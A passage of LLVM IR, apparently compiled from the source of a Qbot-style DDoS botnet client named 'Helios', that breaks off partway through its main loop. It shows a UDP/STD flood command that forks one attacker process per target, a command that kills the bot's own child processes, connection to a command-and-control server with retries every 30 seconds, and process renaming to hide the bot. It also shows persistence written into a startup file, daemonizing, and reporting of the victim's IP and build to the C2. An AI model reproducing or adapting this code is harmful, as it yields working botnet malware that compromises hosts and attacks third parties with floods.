  %429 = load i32, i32* %3, align 4
  %430 = icmp slt i32 %429, 4
  br i1 %430, label %443, label %431

; <label>:431:                                    ; preds = %428
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 2
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #10
  %436 = icmp slt i32 %435, 1
  br i1 %436, label %443, label %437

; <label>:437:                                    ; preds = %431
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 3
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* %440) #10
  %442 = icmp slt i32 %441, 1
  br i1 %442, label %443, label %444

; <label>:443:                                    ; preds = %437, %431, %428
  br label %521

; <label>:444:                                    ; preds = %437
  %445 = load i8**, i8*** %4, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 1
  %447 = load i8*, i8** %446, align 8
  store i8* %447, i8** %25, align 8
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 2
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @atoi(i8* %450) #10
  store i32 %451, i32* %26, align 4
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 3
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #10
  store i32 %455, i32* %27, align 4
  %456 = load i8*, i8** %25, align 8
  %457 = call i8* @strstr(i8* %456, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %458 = icmp ne i8* %457, null
  br i1 %458, label %459, label %475

; <label>:459:                                    ; preds = %444
  %460 = load i8*, i8** %25, align 8
  %461 = call i8* @strtok(i8* %460, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %461, i8** %28, align 8
  br label %462

; <label>:462:                                    ; preds = %472, %459
  %463 = load i8*, i8** %28, align 8
  %464 = icmp ne i8* %463, null
  br i1 %464, label %465, label %474

; <label>:465:                                    ; preds = %462
  %466 = call i32 @listFork()
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %472, label %468

; <label>:468:                                    ; preds = %465
  %469 = load i8*, i8** %28, align 8
  %470 = load i32, i32* %26, align 4
  %471 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %469, i32 %470, i32 %471)
  call void @_exit(i32 0) #12
  unreachable

; <label>:472:                                    ; preds = %465
  %473 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %473, i8** %28, align 8
  br label %462

; <label>:474:                                    ; preds = %462
  br label %483

; <label>:475:                                    ; preds = %444
  %476 = call i32 @listFork()
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %475
  br label %521

; <label>:479:                                    ; preds = %475
  %480 = load i8*, i8** %25, align 8
  %481 = load i32, i32* %26, align 4
  %482 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %480, i32 %481, i32 %482)
  call void @_exit(i32 0) #12
  unreachable

; <label>:483:                                    ; preds = %474
  br label %484

; <label>:484:                                    ; preds = %483, %422
  %485 = load i8**, i8*** %4, align 8
  %486 = getelementptr inbounds i8*, i8** %485, i64 0
  %487 = load i8*, i8** %486, align 8
  %488 = call i32 @strcmp(i8* %487, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.404, i32 0, i32 0)) #10
  %489 = icmp ne i32 %488, 0
  br i1 %489, label %521, label %490

; <label>:490:                                    ; preds = %484
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %491

; <label>:491:                                    ; preds = %517, %490
  %492 = load i64, i64* %30, align 8
  %493 = load i64, i64* @numpids, align 8
  %494 = icmp ult i64 %492, %493
  br i1 %494, label %495, label %520

; <label>:495:                                    ; preds = %491
  %496 = load i32*, i32** @pids, align 8
  %497 = load i64, i64* %30, align 8
  %498 = getelementptr inbounds i32, i32* %496, i64 %497
  %499 = load i32, i32* %498, align 4
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %501, label %516

; <label>:501:                                    ; preds = %495
  %502 = load i32*, i32** @pids, align 8
  %503 = load i64, i64* %30, align 8
  %504 = getelementptr inbounds i32, i32* %502, i64 %503
  %505 = load i32, i32* %504, align 4
  %506 = call i32 @getpid() #2
  %507 = icmp ne i32 %505, %506
  br i1 %507, label %508, label %516

; <label>:508:                                    ; preds = %501
  %509 = load i32*, i32** @pids, align 8
  %510 = load i64, i64* %30, align 8
  %511 = getelementptr inbounds i32, i32* %509, i64 %510
  %512 = load i32, i32* %511, align 4
  %513 = call i32 @kill(i32 %512, i32 9) #2
  %514 = load i32, i32* %29, align 4
  %515 = add nsw i32 %514, 1
  store i32 %515, i32* %29, align 4
  br label %516

; <label>:516:                                    ; preds = %508, %501, %495
  br label %517

; <label>:517:                                    ; preds = %516
  %518 = load i64, i64* %30, align 8
  %519 = add i64 %518, 1
  store i64 %519, i64* %30, align 8
  br label %491

; <label>:520:                                    ; preds = %491
  br label %521

; <label>:521:                                    ; preds = %520, %484, %478, %443, %346, %294, %206, %106, %102, %75, %70, %65, %52, %36
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @HeliosCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @HeliosCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @HeliosCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @AllDemDupes, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 666, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @HeliosCommSock, align 4
  %38 = load i32, i32* @HeliosCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.406, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.407, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.410, i32 0, i32 0), i8** %12, align 8
  %53 = load i8*, i8** %12, align 8
  %54 = call %struct._IO_FILE* @fopen(i8* %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %54, %struct._IO_FILE** %13, align 8
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %56 = icmp eq %struct._IO_FILE* %55, null
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %2
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.412, i32 0, i32 0), i8** %12, align 8
  %58 = load i8*, i8** %12, align 8
  %59 = call %struct._IO_FILE* @fopen(i8* %58, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %59, %struct._IO_FILE** %13, align 8
  br label %60

; <label>:60:                                     ; preds = %57, %2
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %62 = icmp ne %struct._IO_FILE* %61, null
  br i1 %62, label %63, label %140

; <label>:63:                                     ; preds = %60
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %69 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %70 = call i8* @getcwd(i8* %69, i64 256) #2
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #10
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %136

; <label>:74:                                     ; preds = %63
  br label %75

; <label>:75:                                     ; preds = %85, %74
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* %16, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp ne i32 %83, 47
  br i1 %84, label %85, label %88

; <label>:85:                                     ; preds = %75
  %86 = load i32, i32* %16, align 4
  %87 = add nsw i32 %86, -1
  store i32 %87, i32* %16, align 4
  br label %75

; <label>:88:                                     ; preds = %75
  %89 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 0
  %93 = load i8*, i8** %92, align 8
  %94 = load i32, i32* %16, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = call i32 (i8*, i8*, ...) @sprintf(i8* %89, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* %90, i8* %96) #2
  br label %98

; <label>:98:                                     ; preds = %114, %88
  %99 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %100 = call i32 @feof(%struct._IO_FILE* %99) #2
  %101 = icmp ne i32 %100, 0
  %102 = xor i1 %101, true
  br i1 %102, label %103, label %115

; <label>:103:                                    ; preds = %98
  %104 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %105 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %106 = call i8* @fgets(i8* %104, i32 1024, %struct._IO_FILE* %105)
  %107 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %108 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %109 = call i32 @strcasecmp(i8* %107, i8* %108) #10
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %114, label %111

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* %17, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %17, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %103
  br label %98

; <label>:115:                                    ; preds = %98
  %116 = load i32, i32* %17, align 4
  %117 = icmp eq i32 %116, 0
  br i1 %117, label %118, label %132

; <label>:118:                                    ; preds = %115
  %119 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %120 = call i32 @fclose(%struct._IO_FILE* %119)
  %121 = load i8*, i8** %12, align 8
  %122 = call %struct._IO_FILE* @fopen(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.415, i32 0, i32 0))
  store %struct._IO_FILE* %122, %struct._IO_FILE** %18, align 8
  %123 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %124 = icmp ne %struct._IO_FILE* %123, null
  br i1 %124, label %125, label %131

; <label>:125:                                    ; preds = %118
  %126 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %127 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %128 = call i32 @fputs(i8* %126, %struct._IO_FILE* %127)
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %130 = call i32 @fclose(%struct._IO_FILE* %129)
  br label %131

; <label>:131:                                    ; preds = %125, %118
  br label %135

; <label>:132:                                    ; preds = %115
  %133 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %134 = call i32 @fclose(%struct._IO_FILE* %133)
  br label %135

; <label>:135:                                    ; preds = %132, %131
  br label %139

; <label>:136:                                    ; preds = %63
  %137 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %138 = call i32 @fclose(%struct._IO_FILE* %137)
  br label %139

; <label>:139:                                    ; preds = %136, %135
  br label %140

; <label>:140:                                    ; preds = %139, %60
  %141 = call i32 @getOurIP()
  %142 = call i32 @fork() #2
  store i32 %142, i32* %7, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %147

; <label>:144:                                    ; preds = %140
  %145 = load i32, i32* %7, align 4
  %146 = call i32 @waitpid(i32 %145, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:147:                                    ; preds = %140
  %148 = load i32, i32* %7, align 4
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %162, label %150

; <label>:150:                                    ; preds = %147
  %151 = call i32 @fork() #2
  store i32 %151, i32* %8, align 4
  %152 = icmp ne i32 %151, 0
  br i1 %152, label %153, label %154

; <label>:153:                                    ; preds = %150
  call void @exit(i32 0) #14
  unreachable

; <label>:154:                                    ; preds = %150
  %155 = load i32, i32* %8, align 4
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %158, label %157

; <label>:157:                                    ; preds = %154
  br label %160

; <label>:158:                                    ; preds = %154
  %159 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %160

; <label>:160:                                    ; preds = %158, %157
  br label %161

; <label>:161:                                    ; preds = %160
  br label %164

; <label>:162:                                    ; preds = %147
  %163 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %164

; <label>:164:                                    ; preds = %162, %161
  br label %165

; <label>:165:                                    ; preds = %164
  %166 = call i32 @setsid() #2
  %167 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #2
  %168 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %169

; <label>:169:                                    ; preds = %469, %172, %165
  %170 = call i32 @initConnection()
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %172, label %174

; <label>:172:                                    ; preds = %169
  %173 = call i32 @sleep(i32 30)
  br label %169

; <label>:174:                                    ; preds = %169
  %175 = load i32, i32* @HeliosCommSock, align 4
  %176 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %177 = call i8* @inet_ntoa(i32 %176) #2
  %178 = call i8* @getBuild()
  %179 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %175, i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.417, i32 0, i32 0), i8* %177, i8* %178)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %180

; <label>:180:                                    ; preds = %468, %390, %312, %269, %174
  %181 = load i32, i32* @HeliosCommSock, align 4
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %183 = call i32 @recvLine(i32 %181, i8* %182, i32 4096)
  store i32 %183, i32* %20, align 4
  %184 = icmp ne i32 %183, -1
  br i1 %184, label %185, label %469

; <label>:185:                                    ; preds = %180
  store i32 0, i32* %21, align 4
  br label %186

; <label>:186:                                    ; preds = %257, %185
  %187 = load i32, i32* %21, align 4
  %188 = sext i32 %187 to i64
  %189 = load i64, i64* @numpids, align 8
  %190 = icmp ult i64 %188, %189
  br i1 %190, label %191, label %260

; <label>:191:                                    ; preds = %186
  %192 = load i32*, i32** @pids, align 8
  %193 = load i32, i32* %21, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i32, i32* %192, i64 %194
  %196 = load i32, i32* %195, align 4
  %197 = call i32 @waitpid(i32 %196, i32* null, i32 1)
  %198 = icmp sgt i32 %197, 0
  br i1 %198, label %199, label %256

; <label>:199:                                    ; preds = %191
  %200 = load i32, i32* %21, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %23, align 4
  br label %202

; <label>:202:                                    ; preds = %218, %199
  %203 = load i32, i32* %23, align 4
  %204 = zext i32 %203 to i64
  %205 = load i64, i64* @numpids, align 8
  %206 = icmp ult i64 %204, %205
  br i1 %206, label %207, label %221

; <label>:207:                                    ; preds = %202
  %208 = load i32*, i32** @pids, align 8
  %209 = load i32, i32* %23, align 4
  %210 = zext i32 %209 to i64
  %211 = getelementptr inbounds i32, i32* %208, i64 %210
  %212 = load i32, i32* %211, align 4
  %213 = load i32*, i32** @pids, align 8
  %214 = load i32, i32* %23, align 4
  %215 = sub i32 %214, 1
  %216 = zext i32 %215 to i64
  %217 = getelementptr inbounds i32, i32* %213, i64 %216
  store i32 %212, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %207
  %219 = load i32, i32* %23, align 4
  %220 = add i32 %219, 1
  store i32 %220, i32* %23, align 4
  br label %202

; <label>:221:                                    ; preds = %202
  %222 = load i32*, i32** @pids, align 8
  %223 = load i32, i32* %23, align 4
  %224 = sub i32 %223, 1
  %225 = zext i32 %224 to i64
  %226 = getelementptr inbounds i32, i32* %222, i64 %225
  store i32 0, i32* %226, align 4
  %227 = load i64, i64* @numpids, align 8
  %228 = add i64 %227, -1
  store i64 %228, i64* @numpids, align 8
  %229 = load i64, i64* @numpids, align 8
  %230 = add i64 %229, 1
  %231 = mul i64 %230, 4
  %232 = call noalias i8* @malloc(i64 %231) #2
  %233 = bitcast i8* %232 to i32*
  store i32* %233, i32** %22, align 8
